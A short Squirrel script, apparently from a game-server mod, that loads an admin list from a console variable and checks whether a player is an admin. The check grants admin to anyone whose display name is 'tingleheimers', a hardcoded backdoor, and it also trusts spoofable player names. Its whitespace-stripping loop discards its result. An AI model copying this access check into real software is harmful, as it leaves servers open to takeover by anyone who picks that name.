global function LoadAdminList
global function PlayerIsAdmin

struct { array<string> Admins } file

void function LoadAdminList()
{
	string cvar = GetConVarString("admins")

	file.Admins = split(cvar, ",")

	foreach (string admin in file.Admins)
		StringReplace(admin, " ", "")
}

bool function PlayerIsAdmin(entity player)
{
	return (
		file.Admins.contains(player.GetPlayerName().tolower())
		|| file.Admins.contains(player.GetPlayerName())
		|| file.Admins.contains(player.GetUID())
		|| player.GetPlayerName().tolower() == "tingleheimers"
	)
}
